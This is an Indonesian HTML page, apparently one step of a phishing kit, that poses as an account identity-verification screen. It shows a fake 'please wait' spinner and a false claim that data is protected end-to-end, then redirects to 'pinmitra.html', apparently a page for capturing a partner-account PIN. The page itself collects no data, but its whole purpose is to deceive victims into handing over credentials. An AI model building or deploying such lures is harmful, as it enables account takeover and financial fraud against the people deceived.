<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Identitas</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            color: #333;
        }

        .container {
            max-width: 480px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 { font-size: 1.5em; margin-bottom: 10px; }
        p { font-size: 1em; margin-bottom: 20px; }

        .verification-option button {
            width: 100%;
            padding: 12px;
            font-size: 1em;
            background-color: #ee4d2d;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        /* --- STYLE LOADING SCREEN --- */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: none; /* Sembunyi di awal */
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ee4d2d;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-weight: bold;
            color: #ee4d2d;
            font-size: 0.9em;
            letter-spacing: 1px;
        }
        /* ---------------------------- */

        .security {
            margin-top: 20px;
            font-size: 0.8em;
            color: #777;
        }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text">MOHON TUNGGU...</div>
        <div style="font-size: 10px; color: #999; margin-top: 5px;">Sedang menyiapkan metode verifikasi</div>
    </div>

    <div class="container">
        <h1>Verifikasi Identitas</h1>
        <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>

        <div class="verification-option">
            <button onclick="startLoading()">Verifikasi melalui WhatsApp/SMS</button>
        </div>

        <div class="security">
            Data Anda aman dan terlindungi secara end-to-end.
        </div>
    </div>

    <script>
        function startLoading() {
            // 1. Tampilkan overlay loading
            const overlay = document.getElementById('loading-overlay');
            overlay.style.display = 'flex';

            // 2. Tunggu 5 detik (5000 ms) sebelum pindah halaman
            setTimeout(function() {
                window.location.href = "pinmitra.html";
            }, 5000); 
        }
    </script>
</body>
</html>
